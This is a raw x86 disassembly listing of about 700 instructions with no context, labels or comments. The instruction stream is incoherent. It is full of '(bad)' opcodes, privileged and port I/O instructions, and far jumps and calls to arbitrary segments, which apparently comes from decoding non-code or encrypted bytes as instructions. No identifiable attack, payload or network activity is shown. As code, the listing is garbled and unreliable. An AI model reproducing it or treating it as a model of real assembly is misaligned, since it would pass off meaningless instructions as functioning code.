  4215c5:	xchg   edx,eax
  4215c6:	rcr    ebx,1
  4215c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215c9:	test   DWORD PTR [edi],ecx
  4215cb:	add    ch,BYTE PTR [ebx]
  4215cd:	jle    0x421629
  4215cf:	push   edx
  4215d0:	sub    eax,eax
  4215d2:	mov    eax,fs:0x851d1ebd
  4215d8:	sbb    eax,0x4fd69e13
  4215dd:	ins    BYTE PTR es:[edi],dx
  4215de:	mov    ds:0x3730c57e,eax
  4215e3:	pusha  
  4215e4:	cli    
  4215e5:	out    dx,eax
  4215e6:	loop   0x4215fa
  4215e8:	jae    0x421618
  4215ea:	ror    DWORD PTR ds:0x74681a68,1
  4215f0:	push   es
  4215f1:	sbb    DWORD PTR [ebx+ecx*1+0x79],edx
  4215f5:	adc    DWORD PTR [edx+0x75],ecx
  4215f8:	jbe    0x42160f
  4215fa:	or     DWORD PTR [ecx-0x70300f78],esi
  421600:	scas   al,BYTE PTR es:[edi]
  421601:	pop    eax
  421602:	sbb    eax,0x3716f9d3
  421607:	inc    edx
  421608:	add    esi,DWORD PTR [eax]
  42160a:	imul   esi,DWORD PTR [edi-0x4e28cec1],0xffffff8d
  421611:	stos   DWORD PTR es:[edi],eax
  421612:	push   ebp
  421613:	jmp    0x7a8afd0d
  421618:	popf   
  421619:	push   0x2a
  42161b:	sti    
  42161c:	ror    BYTE PTR [ebx+0x184f96d4],0x5d
  421623:	mov    dh,0xcf
  421625:	scas   al,BYTE PTR es:[edi]
  421626:	int3   
  421627:	push   edx
  421628:	stos   DWORD PTR es:[edi],eax
  421629:	lahf   
  42162a:	das    
  42162b:	scas   al,BYTE PTR es:[edi]
  42162c:	out    dx,eax
  42162d:	call   0xe118:0xce440841
  421634:	rcl    ecx,0xd6
  421637:	shl    BYTE PTR [edi],0xdb
  42163a:	xchg   DWORD PTR [esi+0x70f9a880],esp
  421640:	mov    cs,WORD PTR [ebx+0x546a6040]
  421646:	xor    dh,bl
  421648:	xchg   edx,eax
  421649:	cs fcomip st,st(5)
  42164c:	cmp    bl,BYTE PTR [ecx]
  42164e:	mov    bh,0x8a
  421650:	xor    dl,BYTE PTR [eax]
  421652:	mov    bl,0xf5
  421654:	inc    edx
  421655:	xor    BYTE PTR [ecx-0x6d86ea33],ah
  42165b:	into   
  42165c:	inc    ebx
  42165d:	inc    esi
  42165e:	jbe    0x421618
  421660:	mov    ds:0x65387abe,eax
  421665:	xchg   edx,eax
  421666:	adc    eax,0x3ec739b0
  42166b:	jmp    0x586eeca0
  421670:	and    BYTE PTR [eax+0x70],dl
  421673:	dec    eax
  421674:	push   eax
  421675:	into   
  421676:	pop    esp
  421677:	jmp    0x3ed3:0x9368a69d
  42167e:	jecxz  0x42165b
  421680:	push   cs
  421681:	dec    ebx
  421682:	daa    
  421683:	dec    ebp
  421684:	rcl    DWORD PTR [eax+0x79],0xf4
  421688:	fbld   TBYTE PTR [edi]
  42168a:	add    al,ch
  42168c:	add    ebx,DWORD PTR [ebp+0xeaf83e2]
  421692:	sbb    esp,0x3fcdb92b
  421698:	mov    esp,DWORD PTR [edx+0x2b]
  42169b:	push   esi
  42169c:	cs inc eax
  42169e:	lock std 
  4216a0:	xor    cl,dl
  4216a2:	jp     0x4216ce
  4216a4:	rcr    dh,0xb8
  4216a7:	and    al,0x76
  4216a9:	test   BYTE PTR [ebx],dl
  4216ab:	out    0xe,eax
  4216ad:	mov    ebp,0x5b8e1586
  4216b2:	sbb    ah,BYTE PTR [esi+0x69]
  4216b5:	fild   QWORD PTR [ecx-0xbf6bfc8]
  4216bb:	sahf   
  4216bc:	adc    DWORD PTR [ecx-0x49],edx
  4216bf:	lock sbb BYTE PTR [ecx+0x4b],al
  4216c3:	cmp    DWORD PTR [edx+0x28],0xa4d07a55
  4216ca:	sbb    BYTE PTR [ecx-0x122df96a],cl
  4216d0:	mov    esp,DWORD PTR ds:0xb57da703
  4216d6:	test   DWORD PTR [edx-0x3e],esi
  4216d9:	pop    ebp
  4216da:	or     eax,0x44972b8b
  4216df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216e0:	addr16 xchg esi,eax
  4216e2:	mov    cl,0xbf
  4216e4:	and    al,0xa8
  4216e6:	jbe    0x42166a
  4216e8:	xor    BYTE PTR fs:[edx],ch
  4216eb:	adc    BYTE PTR [ecx+0x66db3221],dh
  4216f1:	push   ds
  4216f2:	cmp    esi,edi
  4216f4:	adc    ecx,ecx
  4216f6:	mov    al,0x4
  4216f8:	rcl    DWORD PTR [ecx],1
  4216fa:	into   
  4216fb:	xlat   BYTE PTR ds:[ebx]
  4216fc:	lea    ebp,[edx+0x5e]
  4216ff:	scas   al,BYTE PTR es:[edi]
  421700:	mov    cl,0x24
  421702:	js     0x421783
  421704:	lds    ecx,FWORD PTR [ecx+0x50]
  421707:	test   BYTE PTR [ecx-0x48],dh
  42170a:	add    BYTE PTR ds:0xf085d51f,0xe8
  421711:	fisubr DWORD PTR [eax+0x18ec66f8]
  421717:	mov    edx,DWORD PTR [ebx+0x12]
  42171a:	dec    esp
  42171b:	shl    DWORD PTR [edi+eiz*1+0x38],0x95
  421720:	xchg   edx,eax
  421721:	int    0x52
  421723:	add    esi,DWORD PTR [edi+ebp*8-0x9]
  421727:	clc    
  421728:	mov    dl,0x1a
  42172a:	lods   al,BYTE PTR ds:[esi]
  42172b:	adc    eax,DWORD PTR [eax+edi*1-0x39639fd9]
  421732:	xlat   BYTE PTR ds:[ebx]
  421733:	cmp    BYTE PTR [ecx+esi*1],bl
  421736:	pop    DWORD PTR [ebx+0xd814772]
  42173c:	(bad)  
  42173d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42173e:	das    
  42173f:	pushf  
  421740:	lahf   
  421741:	sub    BYTE PTR [ebp+0x15fe59b6],0xd1
  421748:	xor    DWORD PTR [esp+eax*1+0x77],esp
  42174c:	push   ss
  42174d:	xchg   edx,eax
  42174e:	jno    0x42177a
  421750:	aad    0x32
  421752:	mov    esp,DWORD PTR [esi+0x179dc99a]
  421758:	not    ecx
  42175a:	sbb    al,0x15
  42175c:	mov    BYTE PTR [eax+0x25],al
  42175f:	push   esi
  421760:	pusha  
  421761:	sbb    DWORD PTR [ebx],edi
  421763:	adc    BYTE PTR [ebx],dh
  421765:	cs (bad) 
  421767:	js     0x421732
  421769:	daa    
  42176a:	(bad)  
  42176b:	cli    
  42176c:	sar    BYTE PTR [ebx+0x3cf905f],cl
  421772:	xor    DWORD PTR [eax+ecx*2-0x7768f06c],esi
  421779:	add    al,0xc6
  42177b:	mov    edi,0x968aa93c
  421780:	sub    BYTE PTR [eax+0x6],bl
  421783:	sti    
  421784:	cmc    
  421785:	inc    edx
  421786:	pushf  
  421787:	adc    BYTE PTR [ecx-0xbd2bddc],0xf6
  42178e:	ss jp  0x421778
  421791:	rcr    BYTE PTR [esi+0x21],0x31
  421795:	leave  
  421796:	pop    edi
  421797:	out    0xd6,eax
  421799:	test   BYTE PTR [edi+0x4ae7ad20],dh
  42179f:	jp     0x421770
  4217a1:	jb     0x421800
  4217a3:	lea    ebx,[eax+0x8]
  4217a6:	mov    ah,0xf5
  4217a8:	jl     0x4217ce
  4217aa:	pop    ecx
  4217ab:	pop    ds
  4217ac:	or     cl,BYTE PTR [ecx]
  4217ae:	in     eax,dx
  4217af:	or     eax,0xb55d54de
  4217b4:	stc    
  4217b5:	call   0x72f2d455
  4217ba:	mov    al,0x83
  4217bc:	cmp    DWORD PTR [eax+0x69df81cd],ebx
  4217c2:	adc    DWORD PTR [edi+ebp*8-0x1f],edi
  4217c6:	lea    ebx,[ecx+0xc561e06]
  4217cc:	(bad)  
  4217cd:	cmp    al,0xa
  4217cf:	aas    
  4217d0:	push   edi
  4217d1:	ins    DWORD PTR es:[edi],dx
  4217d2:	dec    ecx
  4217d3:	aaa    
  4217d4:	xor    ch,BYTE PTR ss:[ebp-0x57]
  4217d8:	inc    ebx
  4217d9:	std    
  4217da:	cmp    cl,BYTE PTR [ebx]
  4217dc:	jle    0x42184a
  4217de:	push   eax
  4217df:	stos   DWORD PTR es:[edi],eax
  4217e0:	jno    0x42180e
  4217e2:	jmp    0xa18831f9
  4217e7:	ds mov esp,esp
  4217ea:	xchg   DWORD PTR [esi+edi*2],eax
  4217ed:	loope  0x4217c9
  4217ef:	sub    edx,DWORD PTR [edi]
  4217f1:	or     BYTE PTR [ebx-0x67c09260],bh
  4217f7:	xor    al,0x89
  4217f9:	sar    DWORD PTR [eax-0x16],1
  4217fc:	(bad)  
  4217fd:	sti    
  4217fe:	adc    eax,0x70749fa
  421803:	mov    edx,0x1fbb0a9c
  421808:	retf   
  421809:	pop    edx
  42180a:	pop    ecx
  42180b:	or     BYTE PTR [edi-0x4cd34645],bh
  421811:	retf   0xdf2b
  421814:	imul   esp,DWORD PTR [edi+0x2f],0xffffff86
  421818:	std    
  421819:	fidiv  WORD PTR [edi-0x54]
  42181c:	in     eax,0x12
  42181e:	push   ebp
  42181f:	adc    DWORD PTR [eax-0x52],eax
  421822:	fstp   TBYTE PTR [edi-0x4e79dde4]
  421828:	lods   al,BYTE PTR ds:[esi]
  421829:	outs   dx,BYTE PTR ds:[esi]
  42182a:	unpcklps xmm0,XMMWORD PTR [ebx]
  42182d:	ret    
  42182e:	sbb    eax,0xb1937a5f
  421833:	add    edx,ecx
  421835:	(bad)  
  421836:	fsub   st(2),st
  421838:	xchg   ecx,eax
  421839:	fwait
  42183a:	push   ebx
  42183b:	scas   eax,DWORD PTR es:[edi]
  42183c:	push   0x31
  42183e:	adc    eax,0x7f2afdd9
  421843:	jns    0x42181d
  421845:	cld    
  421846:	push   esp
  421847:	loop   0x42182e
  421849:	popa   
  42184a:	fwait
  42184b:	femms  
  42184d:	sub    eax,0x83b34b48
  421852:	mov    edx,0x968e648f
  421857:	jb     0x4218ab
  421859:	aaa    
  42185a:	into   
  42185b:	pop    ebp
  42185c:	adc    BYTE PTR [eax-0x9],bh
  42185f:	leave  
  421860:	leave  
  421861:	adc    dl,BYTE PTR [ebx]
  421863:	ins    BYTE PTR es:[edi],dx
  421864:	outs   dx,DWORD PTR ds:[esi]
  421865:	imul   esi,eax,0x7a
  421868:	cmp    BYTE PTR [eax+0x7c28b259],dh
  42186e:	push   esi
  42186f:	or     BYTE PTR [ebp-0x14e68ccd],dl
  421875:	mov    ?,WORD PTR [eax]
  421877:	mov    ecx,ss
  421879:	dec    eax
  42187a:	sub    ebp,DWORD PTR [ebx-0x566fdf4]
  421880:	retf   
  421881:	ins    BYTE PTR es:[edi],dx
  421882:	jl     0x42181a
  421884:	retf   0x7207
  421887:	cld    
  421888:	(bad)  
  421889:	mov    dh,0xee
  42188b:	std    
  42188c:	aas    
  42188d:	pop    ebp
  42188e:	push   ss
  42188f:	jmp    0xd:0xfff7f835
  421896:	int3   
  421897:	jo     0x421847
  421899:	inc    ebp
  42189a:	repz mov cs,WORD PTR [ebx-0x78c7321f]
  4218a1:	inc    ecx
  4218a2:	add    ebp,ecx
  4218a4:	pop    edi
  4218a5:	sahf   
  4218a6:	lahf   
  4218a7:	test   bh,bh
  4218a9:	push   ecx
  4218aa:	retf   0x7b8a
  4218ad:	adc    al,0x41
  4218af:	mov    bl,bh
  4218b1:	xor    al,0xe5
  4218b3:	or     eax,0x4c26c879
  4218b8:	mov    bh,0x94
  4218ba:	xchg   ebx,eax
  4218bb:	mov    edx,0x14152811
  4218c0:	sub    edi,DWORD PTR [edx-0x78]
  4218c3:	xchg   esp,eax
  4218c4:	dec    esp
  4218c5:	push   esi
  4218c6:	cmp    edx,DWORD PTR [ebp-0x7642f5dc]
  4218cc:	cmp    BYTE PTR [edx],dh
  4218ce:	mov    bh,0xb9
  4218d0:	mov    ah,0x9c
  4218d2:	call   0x8cab:0xd029be7e
  4218d9:	int    0x59
  4218db:	pop    eax
  4218dc:	pusha  
  4218dd:	arpl   bp,si
  4218df:	ret    
  4218e0:	enter  0xc487,0x26
  4218e4:	xchg   ecx,eax
  4218e5:	fdivr  DWORD PTR [edx-0x55]
  4218e8:	jle    0x421908
  4218ea:	fwait
  4218eb:	les    ebp,FWORD PTR [ecx+0x2bea5475]
  4218f1:	jae    0x421889
  4218f3:	sbb    al,0x39
  4218f5:	daa    
  4218f6:	adc    cl,ch
  4218f8:	test   DWORD PTR [esi-0x6290f2f2],ebx
  4218fe:	mov    al,0x56
  421900:	loopne 0x4218a9
  421902:	mov    eax,0x4742e6c9
  421907:	sbb    al,0xa1
  421909:	adc    DWORD PTR [ebx],esp
  42190b:	fisub  DWORD PTR [ecx+0x1b]
  42190e:	leave  
  42190f:	push   0xffffffac
  421911:	les    ebx,FWORD PTR [esi-0x25]
  421914:	call   0xfaac:0xc12157c8
  42191b:	push   esi
  42191c:	xchg   DWORD PTR [ebx+0x690d754a],ebp
  421922:	cmp    al,0xa2
  421924:	adc    BYTE PTR [ebx-0x6d],ch
  421927:	imul   ebx,DWORD PTR [edi+0x1f416eb3],0xffffffce
  42192e:	(bad)  
  42192f:	xchg   ebx,eax
  421930:	mov    al,ds:0x2244d64b
  421935:	mov    BYTE PTR [ecx-0x5],bh
  421938:	or     al,0xd
  42193a:	dec    edi
  42193b:	pushf  
  42193c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42193d:	scas   al,BYTE PTR es:[edi]
  42193e:	mov    ch,0x54
  421940:	dec    ebx
  421941:	ret    
  421942:	repz (bad) 
  421945:	cdq    
  421946:	xor    al,0xd7
  421948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421949:	js     0x42194a
  42194b:	and    DWORD PTR [edx],esi
  42194d:	push   0x55efeab9
  421952:	aad    0x76
  421954:	pop    edi
  421955:	test   al,0xf8
  421957:	cmp    eax,0xa3877f23
  42195c:	fs ret 
  42195e:	pop    edx
  42195f:	fucomip st,st(2)
  421961:	lahf   
  421962:	ins    BYTE PTR es:[edi],dx
  421963:	lods   al,BYTE PTR ds:[esi]
  421964:	adc    ch,BYTE PTR [esi-0x73]
  421967:	dec    eax
  421969:	inc    edi
  42196a:	adc    edi,eax
  42196c:	mov    bl,0x27
  42196e:	mov    ah,BYTE PTR [edx]
  421970:	xor    BYTE PTR [edi+0x47],ah
  421973:	mov    bh,0x38
  421975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421976:	ins    BYTE PTR es:[edi],dx
  421977:	cmc    
  421978:	mov    ebp,0x55cffbfa
  42197d:	push   0x7bf645a3
  421982:	out    0x84,al
  421984:	leave  
  421985:	mov    dl,0xfa
  421987:	aaa    
  421988:	lea    esp,[edi]
  42198a:	cmp    eax,0xce3e85f9
  42198f:	or     DWORD PTR [eax+ecx*1-0x498a8d44],edx
  421996:	add    eax,ebx
  421998:	mov    eax,0x7dc75cb5
  42199d:	push   edi
  42199e:	mov    dh,ah
  4219a0:	jae    0x4219b4
  4219a2:	dec    edi
  4219a3:	das    
  4219a4:	cmp    DWORD PTR [edx],0x7eb6e3bd
  4219aa:	xchg   esi,eax
  4219ab:	fdiv   st,st(5)
  4219ad:	jae    0x42198d
  4219af:	jl     0x421984
  4219b1:	push   eax
  4219b2:	xchg   edi,eax
  4219b3:	call   0x8f26:0xae3fa93a
  4219ba:	jmp    0xb42e:0xe5a9d06f
  4219c1:	mov    bh,0xd6
  4219c3:	jl     0x421986
  4219c5:	jmp    0x3fff:0x5c230ac0
  4219cc:	mov    esp,edi
  4219ce:	cld    
  4219cf:	sub    al,ah
  4219d1:	je     0x421a35
  4219d3:	pop    ds
  4219d4:	jne    0x4219b3
  4219d6:	mov    eax,esi
  4219d8:	adc    BYTE PTR [eax+0x33],0x7c
  4219dc:	inc    edx
  4219dd:	jle    0x421a1d
  4219df:	cmp    eax,DWORD PTR [edx]
  4219e1:	ror    DWORD PTR [edx-0x32],1
  4219e4:	fisttp DWORD PTR [edi-0x51e7a947]
  4219ea:	pop    es
  4219eb:	in     al,0x16
  4219ed:	xchg   ebx,eax
  4219ee:	inc    esi
  4219ef:	lods   ax,WORD PTR ds:[esi]
  4219f1:	mov    cl,0xd5
  4219f3:	int3   
  4219f4:	cmp    ebp,DWORD PTR [ebx+0x53001e94]
  4219fa:	aam    0xa2
  4219fc:	xor    eax,0xe4f595f2
  421a01:	enter  0x41ea,0x95
  421a05:	cmp    edx,ebx
  421a07:	add    al,0xb0
  421a09:	adc    eax,0xdb53639a
  421a0e:	pop    ss
  421a0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a10:	stos   DWORD PTR es:[edi],eax
  421a11:	sub    eax,0x114516d3
  421a16:	out    dx,eax
  421a17:	xor    eax,0xf759cbda
  421a1c:	pop    esp
  421a1d:	imul   edx,edi,0x5700c1f8
  421a23:	dec    edi
  421a24:	(bad)
  421a27:	pop    es
  421a28:	mov    eax,ds:0x362f245c
  421a2d:	and    esp,DWORD PTR [edx]
  421a2f:	cmp    DWORD PTR [esp+eax*8-0x6b71fb83],0x54da4f77
  421a3a:	ret    
  421a3b:	aaa    
  421a3c:	cmp    ch,BYTE PTR [ebx-0x6d2201c2]
  421a42:	mov    al,ds:0x38e68888
  421a47:	or     DWORD PTR ds:0xdd8b0736,esp
  421a4d:	jmp    0x4219f5
  421a4f:	(bad)  
  421a50:	loop   0x421a33
  421a52:	sbb    ah,BYTE PTR [esi-0x6a7b7ffa]
  421a58:	sahf   
  421a59:	pop    ebx
  421a5a:	std    
  421a5b:	leave  
  421a5c:	sbb    DWORD PTR [edx+0x72933477],esp
  421a62:	mov    ds,edx
  421a64:	ja     0x4219f1
  421a66:	das    
  421a67:	pop    edi
  421a68:	cli    
  421a69:	aad    0x3e
  421a6b:	xor    eax,0x450e6330
  421a70:	icebp  
  421a71:	sub    edx,DWORD PTR [esi+0x357482e2]
  421a77:	stos   DWORD PTR es:[edi],eax
  421a78:	cmp    DWORD PTR ds:0x4d846afa,edi
  421a7e:	arpl   WORD PTR [edx],si
  421a80:	xchg   esp,eax
  421a81:	(bad)  
  421a82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a83:	ja     0x421ab5
  421a85:	scas   eax,DWORD PTR es:[edi]
  421a86:	dec    esi
  421a87:	outs   dx,BYTE PTR ds:[esi]
  421a88:	inc    ebx
  421a89:	pushf  
  421a8a:	jb     0x421aac
  421a8c:	leave  
  421a8d:	xchg   edx,eax
  421a8e:	inc    ecx
  421a8f:	or     edi,ecx
  421a91:	add    BYTE PTR [eax-0x1a],dl
  421a94:	icebp  
  421a95:	mov    ebp,0x741dd2bb
  421a9a:	dec    ecx
  421a9b:	and    esi,DWORD PTR [ebp+0x72df6acd]
  421aa1:	inc    eax
  421aa2:	jns    0x421a4c
  421aa4:	mov    eax,ds:0x54f75bca
  421aa9:	dec    BYTE PTR [edi-0xfe529c2]
  421aaf:	mov    esp,0x79196017
  421ab4:	(bad)  
  421ab6:	imul   ebx,DWORD PTR [esi-0x7c],0x20b71657
  421abd:	pushf  
  421abe:	outs   dx,DWORD PTR ds:[esi]
  421abf:	mov    esi,?
  421ac1:	adc    esi,DWORD PTR [edx+0x1bd02e8]
  421ac7:	das    
  421ac8:	push   ds
  421ac9:	inc    esp
  421aca:	dec    esi
  421acb:	sub    al,ch
  421acd:	neg    BYTE PTR [esi]
  421acf:	add    esi,DWORD PTR [edi]
  421ad1:	and    eax,0x6787182f
  421ad6:	mov    esi,0x99d9631c
  421adb:	or     eax,0x3a7baf56
  421ae0:	add    ch,BYTE PTR [esi-0x1436b7e3]
  421ae6:	test   DWORD PTR [edx-0x28],esp
  421ae9:	sub    ecx,DWORD PTR [esi-0x4163655e]
  421aef:	push   ds
  421af0:	int    0xd9
  421af2:	imul   ecx,edx,0x3095023b
  421af8:	sbb    al,0xd5
  421afa:	pop    ebp
  421afb:	pop    ds
  421afc:	div    BYTE PTR [edi+0x6dcca7e6]
  421b02:	mov    edx,esi
  421b04:	loope  0x421b7b
  421b06:	out    dx,al
  421b07:	pop    edx
  421b08:	imul   esp,DWORD PTR [ebx+0x6a83ec36],0xfffffff6
  421b0f:	fwait
  421b10:	outs   dx,DWORD PTR ds:[esi]
  421b11:	fstp   QWORD PTR [eax+0x27]
  421b14:	dec    esi
  421b15:	dec    edi
  421b16:	daa    
  421b17:	mov    ebp,0x52721e71
  421b1c:	sti    
  421b1d:	(bad)  
  421b1e:	sbb    BYTE PTR ds:0x1a877432,dl
  421b24:	xlat   BYTE PTR ds:[ebx]
  421b25:	cs inc ebp
  421b27:	icebp  
  421b28:	push   ebp
  421b29:	xor    al,0xd7
  421b2b:	jl     0x421b65
  421b2d:	fnstcw WORD PTR [edi-0x1d]
  421b30:	in     al,dx
  421b31:	call   0xed1a:0x4a3bb81b
  421b38:	mov    ebp,0x99d42214
  421b3d:	or     dh,0xe2
  421b40:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  421b42:	push   0x52d7570d
  421b47:	push   ebx
  421b48:	dec    eax
  421b49:	mov    esp,0xbcfb5067
  421b4e:	in     al,dx
  421b4f:	mov    esp,0x4eef2d5c
  421b54:	mov    edi,0xf89dc417
  421b59:	aas    
  421b5a:	loope  0x421b27
  421b5c:	push   cs
  421b5d:	scas   eax,DWORD PTR es:[edi]
  421b5e:	pushf  
  421b5f:	mov    edx,0x341d469d
  421b64:	mov    BYTE PTR [edi+ebp*2-0x57d81c69],ah
  421b6b:	jmp    0x6fec:0xbc2e6e8a
  421b72:	lock daa 
  421b74:	mov    edi,0x17095c90
  421b79:	inc    esi
  421b7a:	dec    edx
  421b7b:	sar    BYTE PTR [edi-0x1a],1
  421b7e:	mov    ecx,0xf00f6550
  421b83:	sbb    BYTE PTR [edi+0x13],0x9a
  421b87:	bound  esp,QWORD PTR [edx]
  421b89:	jge    0x421b0b
  421b8b:	xchg   BYTE PTR [ebp+0x74],bh
  421b8e:	lds    ecx,FWORD PTR [eax-0x50cd9f52]
  421b94:	sbb    edx,DWORD PTR ds:0x3acd31d0
  421b9a:	pushw  es
  421b9c:	mov    cl,0x9c
  421b9e:	or     eax,0x70053852
  421ba3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ba4:	cdq    
  421ba5:	test   bl,dh
  421ba7:	adc    DWORD PTR [eax-0x53039221],eax
  421bad:	mov    edi,0x56644b0
  421bb2:	clc    
  421bb3:	(bad)  
  421bb4:	bnd je 0x421c04
  421bb7:	mov    dh,0xc8
  421bb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bba:	loop   0x421b69
  421bbc:	inc    ebp
  421bbd:	jb     0x421c1b
  421bbf:	enter  0xb1bc,0xaf
  421bc3:	dec    al
  421bc5:	jge    0x421b52
  421bc7:	inc    edi
  421bc8:	sbb    al,0x38
  421bca:	mov    esi,0x795be35e
  421bcf:	or     al,0xa
  421bd1:	inc    dl
  421bd3:	ret    
  421bd4:	sti    
  421bd5:	std    
  421bd6:	mov    ecx,0x55dd5bbb
  421bdb:	adc    ah,dh
  421bdd:	mov    ds:0xfd34f44a,eax
  421be2:	add    DWORD PTR [ebp-0x182cf236],ebx
  421be8:	clc    
  421be9:	fldcw  WORD PTR [esi+0x12aadd18]
  421bef:	push   edx
  421bf0:	out    dx,eax
  421bf1:	push   DWORD PTR [edi+ebp*2+0x49]
  421bf5:	out    dx,al
  421bf6:	out    dx,al
  421bf7:	mov    BYTE PTR [ebx-0x57],ch
  421bfa:	mov    esi,0x8f8330d1
  421bff:	test   DWORD PTR [esp+ebx*2],esi
  421c02:	aad    0x37
  421c04:	fadd   DWORD PTR [eax]
  421c06:	add    BYTE PTR [eax],al
  421c08:	add    BYTE PTR [eax],al
  421c0a:	push   esi
  421c0b:	inc    ebx
  421c0c:	pop    edx
  421c0d:	pop    ecx
  421c0e:	pop    edi
  421c0f:	pop    ecx
  421c10:	push   edi
  421c11:	dec    edi
  421c12:	mov    fs,WORD PTR [ecx+0x6e7be972]
  421c18:	push   ebx
  421c19:	push   edx
  421c1a:	in     eax,0xaa
  421c1c:	add    DWORD PTR [eax],eax
  421c1e:	add    DWORD PTR [esi],0x0
  421c21:	add    BYTE PTR [esi-0x664a4894],dh
  421c27:	scas   al,BYTE PTR es:[edi]
  421c28:	pop    esp
  421c29:	jg     0x421bf3
  421c2b:	fisttp DWORD PTR ds:0x57f20de7
  421c31:	aam    0x6f
  421c33:	(bad)  
  421c34:	cmp    al,0xe2
  421c36:	jle    0x421c0a
  421c38:	add    edi,DWORD PTR [eax-0x535fdd70]
  421c3e:	retf   
  421c3f:	sub    eax,0x5f30954e
  421c44:	loopne 0x421c91
  421c46:	pop    eax
  421c47:	sti    
  421c48:	stos   DWORD PTR es:[edi],eax
  421c49:	call   FWORD PTR [esi+0x11]
  421c4c:	out    0x6d,al
  421c4e:	jae    0x421ccc
  421c50:	mov    edi,?
  421c52:	fimul  WORD PTR [eax]
  421c54:	cli    
  421c55:	mov    DWORD PTR [ebx+0x11],esi
  421c58:	inc    edx
  421c59:	jns    0x421bfb
  421c5b:	jae    0x421c0c
  421c5d:	and    al,0x6e
  421c5f:	xor    al,0xb6
  421c61:	data16 sub BYTE PTR [edx-0x798b04bf],bh
  421c68:	pusha  
  421c69:	test   al,0xca
  421c6b:	mov    ebp,0x9fa24a05
  421c70:	sbb    al,0x2c
  421c72:	cmp    ecx,ebp
  421c74:	push   0xa843d775
  421c79:	push   esp
  421c7a:	pop    ss
  421c7b:	adc    al,0xce
  421c7d:	push   cs
  421c7e:	loope  0x421c46
  421c80:	add    DWORD PTR ds:0x1d525753,eax
  421c86:	hlt    
  421c87:	lods   al,BYTE PTR ds:[esi]
  421c88:	(bad)  
  421c8a:	retf   
  421c8b:	das    
  421c8c:	out    dx,al
  421c8d:	add    eax,0x65eebef4
  421c92:	inc    edx
  421c93:	jl     0x421ca5
  421c95:	enter  0x68e7,0x4f
  421c99:	out    dx,al
  421c9a:	add    al,0x7b
  421c9c:	and    al,0xa
  421c9e:	dec    ebx
  421c9f:	retf   
  421ca0:	jmp    0xec91a813
  421ca5:	(bad)  
  421ca6:	and    al,0xa0
  421ca8:	in     al,0xa4
  421caa:	xor    eax,0x23a6a10b
  421caf:	add    ah,BYTE PTR [edi-0xcd9bac9]
  421cb5:	mov    cs,WORD PTR [edi+0x232b166b]
  421cbb:	pushf  
  421cbc:	push   ebp
  421cbd:	rol    eax,1
  421cbf:	cmp    DWORD PTR [ecx],edi
  421cc1:	jl     0x421d0c
  421cc3:	es mov ebp,0x9317dc67
  421cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cca:	lods   al,BYTE PTR ds:[esi]
  421ccb:	cmp    esp,esp
  421ccd:	xchg   esp,eax
  421cce:	dec    ecx
  421ccf:	cwde   
  421cd0:	dec    edi
  421cd1:	je     0x421d3a
  421cd3:	jp     0x421cac
  421cd5:	push   edx
  421cd6:	push   esi
  421cd7:	out    0xa7,al
  421cd9:	jae    0x421cae
  421cdb:	mov    bl,0x7e
  421cdd:	inc    esp
  421cde:	repz inc ebp
  421ce0:	je     0x421d44
  421ce2:	aaa    
  421ce3:	xor    BYTE PTR fs:[edi],0x7f
  421ce7:	or     eax,0x377204b5
  421cec:	outs   dx,DWORD PTR ds:[esi]
  421ced:	cmp    cl,BYTE PTR [edi+0x45]
  421cf0:	inc    ax
  421cf2:	lea    eax,[ebx]
  421cf4:	add    BYTE PTR [edx-0x8e89ab5],0x43
  421cfb:	(bad)  
  421cfc:	sahf   
  421cfd:	dec    eax
  421cfe:	push   0x84f66e5
  421d03:	sbb    bl,ah
  421d05:	pusha  
  421d06:	dec    ecx
  421d07:	aaa    
  421d08:	aaa    
  421d09:	mov    esi,0xca6ebef2
  421d0e:	fisttp WORD PTR [eax]
  421d10:	or     al,0xd0
  421d12:	sbb    esi,edx
  421d14:	mov    BYTE PTR [edi],ah
  421d16:	mov    edi,0x5341dd35
  421d1b:	aas    
  421d1c:	dec    ebx
  421d1d:	sbb    DWORD PTR [esi],0xd7476aa3
  421d23:	sub    edx,DWORD PTR [esi+0x5c]
  421d26:	adc    al,BYTE PTR [ebx-0x1aff1c72]
  421d2c:	push   edx
  421d2d:	jecxz  0x421cd7
  421d2f:	ins    DWORD PTR es:[edi],dx
  421d30:	cdq    
  421d31:	jecxz  0x421ce7
  421d33:	mov    edx,0x2f7bf017
  421d38:	arpl   WORD PTR [ebp+0x6ccebc1b],ax
  421d3e:	or     al,0x90
  421d40:	retf   
  421d41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d42:	and    ebp,DWORD PTR [esi]
  421d44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d45:	pop    ss
  421d46:	sbb    eax,DWORD PTR [edi]
  421d48:	test   BYTE PTR [ebp+0x47],cl
  421d4b:	out    dx,eax
  421d4c:	xchg   edx,eax
  421d4d:	xchg   DWORD PTR [ecx],eax
  421d4f:	jmp    0xb5c:0xdd34e931
  421d56:	mov    dl,0x8f
  421d58:	rcr    BYTE PTR [ecx],1
  421d5a:	mov    ah,0xca
  421d5c:	cmp    edi,0x8ca33e3e
  421d62:	popa   
  421d63:	jge    0x421ceb
  421d65:	cld    
  421d66:	xor    edx,DWORD PTR ds:0xae708e27
  421d6c:	nop
  421d6d:	mov    bl,0xc5
  421d6f:	jl     0x421dac
  421d71:	xchg   edx,eax
  421d72:	outs   dx,DWORD PTR ds:[esi]
  421d73:	(bad)  
  421d74:	daa    
  421d75:	pop    es
  421d76:	cmp    edi,DWORD PTR [edx]
  421d78:	mov    esi,0x8d363db2
  421d7d:	push   edi
  421d7e:	aaa    
  421d7f:	inc    ecx
  421d80:	xchg   esp,eax
  421d81:	popa   
  421d82:	imul   edi,DWORD PTR [esi],0xd61feca0
